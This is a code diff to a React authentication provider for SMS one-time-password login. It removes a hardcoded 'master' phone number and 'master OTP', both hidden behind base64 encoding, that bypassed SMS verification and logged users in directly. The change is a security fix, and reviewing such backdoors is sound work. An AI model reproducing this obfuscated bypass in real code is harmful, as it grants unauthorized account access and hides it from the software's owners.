@@ -47,12 +47,6 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
     const cleaned = phone.replace(/\D/g, "").slice(-10);
     if (cleaned.length < 10) return { success: false, error: "Please enter a valid 10-digit number" };
 
-    // Master test number — skip SMS entirely
-    if (cleaned === atob("Nzg5Nzg5Nzg5Nw==").replace(/[^0-9]/g, "")) {
-      setPendingPhone(cleaned);
-      return { success: true };
-    }
-
     try {
       const res = await fetch(`${SUPABASE_URL}/functions/v1/send-otp`, {
         method: "POST",
@@ -73,13 +67,6 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
 
   const verifyOtp = async (otp: string, name?: string): Promise<boolean> => {
     if (!pendingPhone) return false;
-
-    // Master OTP
-    if (otp === atob("Nzg5Nzg5")) {
-      setUser({ phone: pendingPhone, role: "student", name: name?.trim() || undefined });
-      setPendingPhone(null);
-      return true;
-    }
 
     try {
       const res = await fetch(`${SUPABASE_URL}/functions/v1/verify-otp`, {
